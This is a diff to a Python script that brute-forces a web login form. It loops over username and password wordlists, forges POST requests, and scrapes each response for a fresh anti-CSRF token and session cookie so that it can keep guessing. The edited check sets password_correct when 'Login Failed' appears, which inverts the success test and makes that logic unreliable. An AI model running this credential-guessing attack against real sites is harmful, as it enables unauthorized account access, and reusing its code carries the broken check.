@@ -83,10 +83,8 @@ def analyze_resp(resp):
     
     #extract response cookie from set_session in html body
 
-    set_session_pattern = re.compile(r'set_session" value="([a-f0-9]+)"')
+    session_match = re.search(r'set_session" value="([a-f0-9]+)"', resp.text)
     
-    session_match = set_session_pattern.search(resp.text)
-
     if session_match:
         next_cookie = session_match.group(1)
         print("set_session cookie:", next_cookie)
@@ -95,20 +93,17 @@ def analyze_resp(resp):
 
     #extract response cookie from token in html body
 
-    token_pattern = re.compile(r'token" value="([a-f0-9]+)"')
+    token_match = re.search(r'token" value="([a-f0-9]+)"', resp.text)
     
-    match = token_pattern.search(resp.text)
-
-    if match:
-        token = match.group(1)
+    if token_match:
+        token = token_match.group(1)
         print("Token value:", token)
     else:
         return 0
 
     # search for positive password feedback in html body
 
-    pattern_not_failed = re.compile(r'^((?!Login Failed).)*$')
-    pass_match = pattern_not_failed.search(resp.text)
+    pass_match = re.search(r'Login Failed', resp.text)
 
     if pass_match:
         password_correct = True
@@ -130,7 +125,7 @@ def main():
             for user in u.readlines():
                 # password match flag
                 password_correct = False
-                
+
                 for password in f.readlines():
                     resp = forge_post(URL, token, cookie, user, password)
                     (cookie, token, password_correct) = analyze_resp(resp)
